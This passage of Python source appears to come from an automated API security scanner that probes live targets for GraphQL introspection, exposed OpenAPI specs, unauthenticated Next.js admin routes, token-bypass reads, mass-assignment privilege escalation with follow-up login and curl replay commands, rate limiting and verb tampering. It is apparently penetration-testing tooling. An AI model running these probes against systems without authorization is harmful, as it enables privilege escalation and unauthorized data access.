        candidate_paths=list(candidate_paths or []),
    )
    if privileged_access_proof:
        probe_method = str(privileged_access_proof.get("method") or "GET")
        probe_body = (
            dict(privileged_access_proof.get("json_body") or {})
            if isinstance(privileged_access_proof.get("json_body"), dict)
            else None
        )
        inject_token_body = bool(privileged_access_proof.get("inject_token_body"))

        def replay_probe_body(token_placeholder: str | None = None) -> dict[str, Any] | None:
            if probe_body is None:
                return None
            body = dict(probe_body)
            if inject_token_body:
                if token_placeholder:
                    body["token"] = token_placeholder
                else:
                    body.pop("token", None)
            return body

        evidence["privileged_access_proof"] = privileged_access_proof
        evidence["replay_commands"]["control_probe"] = _curl_request_command(
            probe_method,
            f"{target}{privileged_access_proof['endpoint']}",
            json_body=replay_probe_body(),
        )
        if baseline_account and baseline_login.get("token"):
            evidence["replay_commands"]["baseline_probe"] = _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                headers={"Authorization": "Bearer <baseline_token>"},
                json_body=replay_probe_body("<baseline_token>"),
            )
        if foothold_token and foothold_token != baseline_login.get("token"):
            evidence["replay_commands"]["foothold_probe"] = _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                headers={"Authorization": "Bearer <foothold_token>"},
                json_body=replay_probe_body("<foothold_token>"),
            )
        evidence["replay_commands"]["privileged_probe"] = _curl_request_command(
            probe_method,
            f"{target}{privileged_access_proof['endpoint']}",
            headers={"Authorization": "Bearer <minted_token>"},
            json_body=replay_probe_body("<minted_token>"),
        )
    return evidence


async def _verify_self_write_mass_assignment(
    session: Any,
    *,
    target: str,
    candidate: dict[str, Any],
    request_body: dict[str, Any],
    response: Any,
    field_info: dict[str, Any],
    foothold_token: str | None,
    baseline_token: str | None,
    candidate_paths: list[Any] | None = None,
) -> dict[str, Any]:
    parsed = _load_json(getattr(response, "text", ""))
    response_token = ""
    user_info: dict[str, Any] = {}
    if isinstance(parsed, dict):
        response_token, user_info = _extract_token_and_user_info(parsed)
        user = parsed.get("user")
        if isinstance(user, dict):
            for key in ("email", "role", "id"):
                if not user_info.get(key) and user.get(key) not in (None, ""):
                    user_info[key] = user.get(key)
    jwt_claims = _decode_jwt_claims(response_token)
    effective_role = str(
        user_info.get("role")
        or _claim_value(jwt_claims, ("role",), ("data", "role"))
        or ""
    ).strip()
    elevated_token = response_token or str(foothold_token or "")
    privileged_access_proof = await _probe_privileged_access(
        session,
        target=target,
        elevated_token=elevated_token,
        baseline_token=baseline_token,
        candidate_paths=list(candidate_paths or []),
    )
    if not privileged_access_proof:
        return {}
    response_headers = {
        str(key).lower(): str(value)
        for key, value in dict(getattr(response, "headers", {}) or {}).items()
    }
    probe_method = str(privileged_access_proof.get("method") or "GET")
    probe_body = (
        dict(privileged_access_proof.get("json_body") or {})
        if isinstance(privileged_access_proof.get("json_body"), dict)
        else None
    )
    inject_token_body = bool(privileged_access_proof.get("inject_token_body"))

    def replay_probe_body(token_placeholder: str | None = None) -> dict[str, Any] | None:
        if probe_body is None:
            return None
        body = dict(probe_body)
        if inject_token_body:
            if token_placeholder:
                body["token"] = token_placeholder
            else:
                body.pop("token", None)
        return body

    evidence = {
        "mutation_endpoint": candidate["path"],
        "mutation_method": str(candidate.get("method") or "POST"),
        "token_observed": bool(response_token),
        "session_cookie_observed": bool(response_headers.get("set-cookie")),
        "persisted_role": effective_role or str(field_info.get("value") or ""),
        "effective_role": effective_role,
        "user_info": user_info,
        "jwt_claims": jwt_claims,
        "response_preview": getattr(response, "text", "")[:300],
        "privileged_access_proof": privileged_access_proof,
        "replay_commands": {
            "self_write": _curl_request_command(
                str(candidate.get("method") or "POST"),
                f"{target}{candidate['path']}",
                headers={"Authorization": "Bearer <foothold_token>"},
                json_body=request_body,
            ),
            "control_probe": _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                json_body=replay_probe_body(),
            ),
            "privileged_probe": _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                headers={"Authorization": "Bearer <minted_token>"},
                json_body=replay_probe_body("<minted_token>"),
            ),
        },
    }
    if baseline_token:
        evidence["replay_commands"]["baseline_probe"] = _curl_request_command(
            probe_method,
            f"{target}{privileged_access_proof['endpoint']}",
            headers={"Authorization": "Bearer <baseline_token>"},
            json_body=replay_probe_body("<baseline_token>"),
        )
    return evidence


def _sample_openapi_path(path: str) -> str | None:
    """Replace OpenAPI path variables with conservative sample values."""
    sampled = str(path or "").strip()
    if not sampled.startswith("/"):
        sampled = f"/{sampled}"

    def repl(match: re.Match[str]) -> str:
        name = match.group(1).lower()
        if "id" in name or name in {"pk", "uid"}:
            return "1"
        if "page" in name or "limit" in name:
            return "1"
        return "test"

    sampled = re.sub(r"\{([^}/]+)\}", repl, sampled)
    if "{" in sampled or "}" in sampled:
        return None
    return sampled


def _join_openapi_path(base_path: str, path: str) -> str:
    from urllib.parse import urlparse

    base = str(base_path or "").strip()
    if base.startswith(("http://", "https://")):
        parsed = urlparse(base)
        base = parsed.path or ""
    if base in {"", "/"}:
        return path
    if not base.startswith("/"):
        base = f"/{base}"
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


async def _probe_graphql_surface(
    session: Any,
    target: str,
    headers: dict[str, str],
) -> tuple[list[dict[str, Any]], list[dict[str, Any]], int]:
    tested = 0
    findings: list[dict[str, Any]] = []
    candidates: list[dict[str, Any]] = []
    probe_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        **headers,
    }

    for path in GRAPHQL_PATHS:
        tested += 1
        endpoint = f"{target}{path}"
        try:
            response = await session.request(
                "POST",
                endpoint,
                json_data={"query": _GRAPHQL_INTROSPECTION_QUERY},
                headers=probe_headers,
            )
        except Exception:
            continue
        if response.status != 200:
            continue
        parsed = _load_json(response.text)
        schema = parsed.get("data", {}).get("__schema") if isinstance(parsed, dict) else None
        if not isinstance(schema, dict):
            continue
        candidates = _extract_graphql_privileged_candidates(schema, path)

        types = [t for t in schema.get("types") or [] if isinstance(t, dict)]
        field_count = sum(
            len(t.get("fields") or [])
            for t in types
            if isinstance(t.get("fields"), list)
        )
        query_type = (schema.get("queryType") or {}).get("name", "")
        mutation_type = (schema.get("mutationType") or {}).get("name", "")
        findings.append(
            {
                "type": "graphql_introspection_enabled",
                "title": "GraphQL introspection enabled",
                "endpoint": endpoint,
                "affected_component": endpoint,
                "payload": "__schema introspection query",
                "description": (
                    "The GraphQL endpoint returned schema introspection data, "
                    "enabling live API enumeration for authorization and business logic tests."
                ),
                "evidence": (
                    f"query_type={query_type} mutation_type={mutation_type} "
                    f"types={len(types)} fields={field_count}"
                ),
                "severity": "medium",
                "cwe": "CWE-200",
            }
        )
        break
    return findings, candidates, tested


async def _probe_openapi_surface(
    session: Any,
    target: str,
    headers: dict[str, str],
) -> tuple[list[dict[str, Any]], list[dict[str, Any]], int]:
    from vxis.primitives.patterns import parse_openapi

    tested = 0
    findings: list[dict[str, Any]] = []
    candidates: list[dict[str, Any]] = []

    for path in OPENAPI_PATHS:
        tested += 1
        spec_url = f"{target}{path}"
        try:
            response = await session.request("GET", spec_url, headers=headers or None)
        except Exception:
            continue
        if response.status != 200 or response.body_length < 20:
            continue
        parsed = parse_openapi(response.text)
        endpoints = list(parsed.get("endpoints") or [])
        if not endpoints:
            continue
        candidates = _extract_openapi_privileged_candidates(parsed)

        findings.append(
            {
                "type": "openapi_schema_exposed",
                "title": "OpenAPI schema exposed",
                "endpoint": spec_url,
                "affected_component": spec_url,
                "payload": path,
                "description": (
                    "An OpenAPI/Swagger schema was reachable and exposes API operations "
                    "that can be used for live authorization and IDOR enumeration."
                ),
                "evidence": (
                    f"version={parsed.get('version', '')} title={parsed.get('title', '')} "
                    f"operations={len(endpoints)} sample={endpoints[:5]}"
                ),
                "severity": "medium",
                "cwe": "CWE-200",
            }
        )

        data_endpoints: list[dict[str, Any]] = []
        for operation in endpoints:
            method = str(operation.get("method") or "").upper()
            if method != "GET":
                continue
            sampled = _sample_openapi_path(str(operation.get("path") or ""))
            if not sampled:
                continue
            live_path = _join_openapi_path(str(parsed.get("base_path") or ""), sampled)
            tested += 1
            try:
                probe = await session.request("GET", f"{target}{live_path}", headers=headers or None)
            except Exception:
                continue
            if probe.status == 200 and _is_unauthenticated_data_response(probe.text):
                data_endpoints.append(
                    {
                        "path": live_path,
                        "status": probe.status,
                        "size": probe.body_length,
                        "preview": probe.text[:240],
                    }
                )
            if len(data_endpoints) >= 5:
                break

        if data_endpoints:
            findings.append(
                {
                    "type": "openapi_unauthenticated_data_endpoint",
                    "title": "OpenAPI-discovered data endpoints returned JSON data",
                    "endpoint": "",
                    "affected_component": target,
                    "payload": ", ".join(item["path"] for item in data_endpoints[:5]),
                    "description": (
                        "GET operations discovered from the OpenAPI schema returned "
                        "non-empty JSON data during live probing."
                    ),
                    "evidence": str(data_endpoints[:5]),
                    "severity": "high" if not headers else "medium",
                    "cwe": "CWE-306",
                }
            )
        break

    return findings, candidates, tested


async def _discover_nextjs_admin_surface(
    session: Any,
    target: str,
) -> tuple[list[dict[str, Any]], dict[str, set[str]], int]:
    tested = 0
    findings: list[dict[str, Any]] = []
    action_candidates: dict[str, set[str]] = {}
    js_paths: set[str] = set()
    js_texts: list[str] = []
    admin_routes: set[str] = set()

    async def fetch(method: str, path: str, **kwargs: Any) -> Any:
        nonlocal tested
        tested += 1
        url = path if path.startswith(("http://", "https://")) else f"{target}{path}"
        return await session.request(method, url, **kwargs)

    seed_pages = ["/", "/admin", "/admin/"]
    for path in seed_pages:
        try:
            response = await fetch("GET", path)
        except Exception:
            continue
        if response.status == 404:
            continue
        body = response.text or ""
        next_data = _extract_next_data(body)
        build_id = str(next_data.get("buildId") or "")
        for js_path in _extract_js_paths(body):
            js_paths.add(js_path)
        if build_id:
            js_paths.add(f"/_next/static/{build_id}/_buildManifest.js")
        admin_routes.update(_extract_admin_routes(body))

    for js_path in sorted(js_paths)[:40]:
        try:
            response = await fetch("GET", js_path)
        except Exception:
            continue
        if response.status != 200 or response.body_length < 20:
            continue
        text = response.text or ""
        js_texts.append(text)
        admin_routes.update(_extract_admin_routes(text))
        _merge_action_candidates(action_candidates, _extract_action_candidates(text))

    for route in sorted(admin_routes)[:20]:
        _merge_action_candidates(action_candidates, _route_to_action_candidates(route))

    exposed_routes: list[dict[str, Any]] = []
    page_chunks: set[str] = set()
    for route in sorted(admin_routes)[:12]:
        try:
            response = await fetch("GET", route)
        except Exception:
            continue
        if response.status != 200 or response.body_length < 1000:
            continue
        body = response.text or ""
        next_data = _extract_next_data(body)
        chunks = [p for p in _extract_js_paths(body) if "/pages/admin/" in p]
        page_chunks.update(chunks)
        if _page_matches_route(next_data, route) or chunks:
            exposed_routes.append({
                "route": route,
                "status": response.status,
                "size": response.body_length,
                "page": next_data.get("page", ""),
                "chunks": chunks[:3],
            })

    for chunk in sorted(page_chunks)[:20]:
        if chunk in js_paths:
            continue
        try:
            response = await fetch("GET", chunk)
        except Exception:
            continue
        if response.status != 200 or response.body_length < 20:
            continue
        text = response.text or ""
        js_texts.append(text)
        _merge_action_candidates(action_candidates, _extract_action_candidates(text))

    if exposed_routes:
        evidence = "\n".join(
            f"{item['route']} -> {item['status']} len={item['size']} "
            f"page={item['page']} chunks={item['chunks']}"
            for item in exposed_routes[:8]
        )
        findings.append({
            "type": "preauth_admin_route_exposure",
            "title": "Unauthenticated delivery of protected Next.js admin routes",
            "endpoint": "",
            "affected_component": target,
            "payload": ", ".join(item["route"] for item in exposed_routes[:5]),
            "description": (
                "Protected /admin routes returned route-specific Next.js HTML or "
                "page chunks before server-side authentication was enforced."
            ),
            "evidence": evidence,
            "severity": "medium",
            "cwe": "CWE-306",
        })

    # A late pass over all collected JS catches action strings from page chunks.
    for text in js_texts:
        _merge_action_candidates(action_candidates, _extract_action_candidates(text))

    return findings, action_candidates, tested


async def _probe_action_read_bypass(
    session: Any,
    target: str,
    action_candidates: dict[str, set[str]],
) -> tuple[list[dict[str, Any]], int]:
    tested = 0
    confirmed: list[dict[str, Any]] = []

    async def post(endpoint: str, payload: dict[str, Any]) -> Any:
        nonlocal tested
        tested += 1
        return await session.request(
            "POST",
            f"{target}{endpoint}",
            json_data=payload,
            headers={"Content-Type": "application/json", "Accept": "application/json, text/plain, */*"},
        )

    for endpoint, actions in sorted(action_candidates.items())[:10]:
        read_actions = [a for a in sorted(actions) if a.startswith("Get")][:12]
        for action in read_actions:
            variants = [
                ("empty token", {"action": action, "token": "", "data": {}}),
                ("omitted token", {"action": action, "data": {}}),
                ("null token", {"action": action, "token": None, "data": {}}),
            ]
            for variant, payload in variants:
                try:
                    response = await post(endpoint, payload)
                except Exception:
                    continue
                if response.status == 200 and _is_unauthenticated_data_response(response.text):
                    confirmed.append({
                        "endpoint": endpoint,
                        "action": action,
                        "variant": variant,
                        "status": response.status,
                        "preview": response.text[:500],
                    })
                    break
            if len(confirmed) >= 6:
                break
        if len(confirmed) >= 6:
            break

    if not confirmed:
        return [], tested

    evidence = "\n".join(
        f"POST {item['endpoint']} action={item['action']} ({item['variant']}) "
        f"-> {item['status']} {item['preview'][:180]}"
        for item in confirmed[:6]
    )
    endpoints = sorted({item["endpoint"] for item in confirmed})
    actions = sorted({item["action"] for item in confirmed})
    return [
        {
            "type": "unauthenticated_action_api_read",
            "title": "Unauthenticated administrative read actions in action-based API",
            "endpoint": endpoints[0] if len(endpoints) == 1 else "",
            "affected_component": f"{target}{endpoints[0]}" if len(endpoints) == 1 else target,
            "payload": ", ".join(f"{item['endpoint']}:{item['action']}" for item in confirmed[:6]),
            "description": (
                "Action-based administrative read APIs returned data with an empty, "
                "missing, or null token. Confirmed actions: "
                + ", ".join(actions[:8])
            ),
            "evidence": evidence,
            "severity": "medium",
            "cwe": "CWE-306",
        }
    ], tested


async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> dict[str, Any]:
    """Test API security: mass assignment, rate limiting, verb tampering.

    Returns:
        {"vulnerable": bool, "findings": [...], "tested": int}
    """
    from vxis.interaction.hands import SessionManager

    target = target_url.rstrip("/")
    findings: list[dict[str, Any]] = []
    tested = 0
    sem = asyncio.Semaphore(15)
    nextjs_findings: list[dict[str, Any]] = []
    action_candidates: dict[str, set[str]] = {}
    graphql_candidates: list[dict[str, Any]] = []
    openapi_candidates: list[dict[str, Any]] = []

    auth_headers: dict[str, str] = {}
    if token:
        auth_headers["Authorization"] = f"Bearer {token}"

    _mgr = SessionManager()
    _session = await _mgr.get_session(target)

    try:
        graphql_findings, graphql_candidates, graphql_tested = await _probe_graphql_surface(
            _session,
            target,
            auth_headers,
        )
        tested += graphql_tested
        findings.extend(graphql_findings)
    except Exception:
        logger.exception("GraphQL API surface probes failed")

    try:
        openapi_findings, openapi_candidates, openapi_tested = await _probe_openapi_surface(
            _session,
            target,
            auth_headers,
        )
        tested += openapi_tested
        findings.extend(openapi_findings)
    except Exception:
        logger.exception("OpenAPI API surface probes failed")

    try:
        nextjs_findings, action_candidates, nextjs_tested = await _discover_nextjs_admin_surface(
            _session,
            target,
        )
        tested += nextjs_tested
        findings.extend(nextjs_findings)
        action_findings, action_tested = await _probe_action_read_bypass(
            _session,
            target,
            action_candidates,
        )
        tested += action_tested
        findings.extend(action_findings)
    except Exception:
        logger.exception("Next.js/action API authorization probes failed")

    discovered_inputs = (
        list(kwargs.get("discovered_paths") or [])
        + list(kwargs.get("discovered_endpoints") or [])
        + list(kwargs.get("discovered_auth_only_endpoints") or [])
    )
    self_write_seed_values = _self_write_seed_values(discovered_inputs, kwargs.get("identities"))
    discovered_candidates = _extract_discovered_privileged_candidates(discovered_inputs)
    self_write_candidates = _extract_discovered_self_write_candidates(
        discovered_inputs,
        seed_values=self_write_seed_values,
    )
    privileged_probe_paths = _privileged_probe_candidates(
        nextjs_findings,
        action_candidates,
        openapi_candidates=openapi_candidates,
        graphql_candidates=graphql_candidates,
        discovered_candidates=discovered_candidates,
    )

    # --- Mass assignment ---
    reg_paths = ["/api/users", "/api/register", "/api/signup", "/api/account"]
    try:
        for path in await _discover_asset_auth_paths(_session):
            lower = path.lower()
            if any(marker in lower for marker in ("signup", "register")) and path not in reg_paths:
                reg_paths.append(path)
    except Exception:
        pass
    for path in reg_paths:
        for field_info in MASS_ASSIGN_FIELDS:
            tested += 1
            async with sem:
                try:
                    suffix = secrets.token_hex(4)
                    username = f"user_{suffix}"
                    email = f"{suffix}@example.test"
                    password = f"Test1234!{suffix}"
                    body = {
                        "username": username,
                        "email": email,
                        "password": password,
                        field_info["field"]: field_info["value"],
                    }
                    r = await _session.request(
                        "POST", f"{target}{path}", json_data=body, headers=auth_headers
                    )
                    if r.status in (200, 201):
                        resp = r.text.lower()
                        if field_info["field"].lower() in resp and field_info["value"].lower() in resp:
                            evidence = f"{field_info['desc']}: field accepted (status {r.status})"
                            finding = {
                                "type": "mass_assignment",
                                "payload": f"{field_info['field']}={field_info['value']} on {path}",
                                "endpoint": path,
                                "evidence": evidence,
                                "response_preview": r.text[:300],
                                "severity": "high",
                            }
                            privilege_blob = f"{field_info['field']} {field_info['value']}".lower()
                            if any(
                                token in privilege_blob
                                for token in ("role", "admin", "isadmin", "is_admin", "privilege")
                            ):
                                finding["control"] = (
                                    "A self-service account flow should ignore or reject privileged "
                                    "fields such as role/admin."
                                )
                                baseline_account: dict[str, str] | None = None
                                control_suffix = secrets.token_hex(4)
                                control_account = {
                                    "email": f"{control_suffix}@example.test",
                                    "password": f"Test1234!{control_suffix}",
                                    "username": f"user_{control_suffix}",
                                }
                                try:
                                    baseline_registration = await _session.request(
                                        "POST",
                                        f"{target}{path}",
                                        json_data=control_account,
                                        headers=auth_headers,
                                    )
                                    if baseline_registration.status in (200, 201):
                                        baseline_account = control_account
                                except Exception:
                                    baseline_account = None
                                credential_evidence = await _verify_mass_assignment_login(
                                    _session,
                                    target=target,
                                    registration_path=path,
                                    email=email,
                                    username=username,
                                    password=password,
                                    persisted_role=str(field_info["value"]),
                                    foothold_token=token,
                                    baseline_account=baseline_account,
                                    candidate_paths=privileged_probe_paths,
                                )
                                if credential_evidence:
                                    finding["credential_evidence"] = credential_evidence
                                    finding["evidence"] = f"{evidence}; relogin succeeded via {credential_evidence['login_endpoint']}"
                                    privileged_access = credential_evidence.get("privileged_access_proof") or {}
                                    if privileged_access:
                                        baseline_status = (
                                            privileged_access.get("baseline_status")
                                            or privileged_access.get("noauth_status")
                                        )
                                        finding["evidence"] += (
                                            f"; privileged probe {privileged_access.get('endpoint', '')} "
                                            f"{baseline_status}->{privileged_access.get('elevated_status', '')}"
                                        )
                            findings.append(finding)
                            logger.info("Mass assignment: %s on %s", field_info["field"], path)
                except Exception:
                    pass

    baseline_token = _baseline_token_from_identities(token, kwargs.get("identities"))
    for candidate in self_write_candidates:
        for field_info in MASS_ASSIGN_FIELDS:
            if not _is_privileged_mass_assign_field(field_info):
                continue
            tested += 1
            async with sem:
                try:
                    body = dict(candidate.get("json_body") or {})
                    body[str(field_info["field"])] = field_info["value"]
                    r = await _session.request(
                        str(candidate.get("method") or "POST"),
                        f"{target}{candidate['path']}",
                        json_data=body,
                        headers=auth_headers or None,
                    )
                    if r.status in (400, 422):
                        adapted_body = _adapt_self_write_body(
                            candidate["path"],
                            body,
                            getattr(r, "text", ""),
                            seed_values=self_write_seed_values,
                        )
                        if adapted_body and adapted_body != body:
                            body = adapted_body
                            r = await _session.request(
                                str(candidate.get("method") or "POST"),
                                f"{target}{candidate['path']}",
                                json_data=body,
                                headers=auth_headers or None,
                            )
                    if r.status not in (200, 201, 202):
                        continue
                    resp = r.text.lower()
                    field_reflected = (
                        field_info["field"].lower() in resp
                        and field_info["value"].lower() in resp
                    )
                    credential_evidence = await _verify_self_write_mass_assignment(
                        _session,
                        target=target,
                        candidate=candidate,
                        request_body=body,
                        response=r,
                        field_info=field_info,
                        foothold_token=token,
                        baseline_token=baseline_token,
                        candidate_paths=privileged_probe_paths,
                    )
                    if not field_reflected and not credential_evidence:
                        continue
                    evidence = (
                        f"{field_info['desc']}: field accepted on authenticated self-write surface "
                        f"(status {r.status})"
                        if field_reflected
                        else (
                            f"{field_info['desc']}: authenticated self-write mutation preserved "
                            f"crown proof after adaptive request shaping (status {r.status})"
                        )
                    )
                    finding = {
                        "type": "mass_assignment",
                        "payload": f"{field_info['field']}={field_info['value']} on {candidate['path']}",
                        "endpoint": candidate["path"],
                        "method": str(candidate.get("method") or "POST"),
                        "evidence": evidence,
                        "response_preview": r.text[:300],
                        "severity": "high",
                        "control": (
                            "An authenticated self-service mutation should ignore or reject "
                            "privileged fields such as role/admin."
                        ),
                    }
                    if credential_evidence:
                        finding["credential_evidence"] = credential_evidence
                        privileged_access = credential_evidence.get("privileged_access_proof") or {}
                        finding["evidence"] += (
                            f"; privileged probe {privileged_access.get('endpoint', '')} "
                            f"{privileged_access.get('baseline_status') or privileged_access.get('noauth_status')}->"
                            f"{privileged_access.get('elevated_status', '')}"
                        )
                    findings.append(finding)
                    logger.info("Mass assignment: %s on %s", field_info["field"], candidate["path"])
                    break
                except Exception:
                    pass

    # --- Rate limiting ---
    rate_paths = ["/api/login", "/api/auth/login", "/login"]
    for path in rate_paths:
        tested += 1
        async with sem:
            statuses = []
            try:
                for _ in range(10):
                    r = await _session.request(
                        "POST",
                        f"{target}{path}",
                        json_data={"username": "admin", "password": "wrong"},
                        headers=auth_headers,
                    )
                    statuses.append(r.status)
                if 429 not in statuses and any(s not in (404, 405) for s in statuses):
                    findings.append({
                        "type": "no_rate_limit",
                        "payload": f"10 rapid requests to {path}",
                        "evidence": f"No 429 response after 10 attempts. Statuses: {statuses}",
                        "severity": "medium",
                    })
            except Exception:
                pass

    # --- HTTP verb tampering ---
    async def test_verb(path: str) -> None:
        nonlocal tested
        async with sem:
            methods = ["GET", "PUT", "DELETE", "PATCH", "OPTIONS"]
            accessible: list[str] = []
            for method in methods:
                tested += 1
                try:
                    r = await _session.request(method, f"{target}{path}", headers=auth_headers)
                    if r.status not in (404, 405, 401, 403):
                        accessible.append(f"{method}({r.status})")
                except Exception:
                    pass
            if len(accessible) >= 3:
                findings.append({
                    "type": "verb_tampering",
                    "payload": f"Multiple methods on {path}",
                    "evidence": f"Accepted: {', '.join(accessible)}",
                    "severity": "medium",
                })

    await asyncio.gather(*[test_verb(p) for p in VERB_TAMPER_PATHS])

    # --- Parameter pollution ---
    tested += 1
    async with sem:
        try:
            r = await _session.request(
                "GET", f"{target}/api/users?id=1&id=2", headers=auth_headers
            )
            if r.status == 200:
                findings.append({
                    "type": "param_pollution",
                    "payload": "id=1&id=2",
                    "evidence": f"Duplicate params accepted (status {r.status})",
                    "response_preview": r.text[:300],
                    "severity": "low",
                })
        except Exception:
            pass

    return {"vulnerable": len(findings) > 0, "findings": findings, "tested": tested}
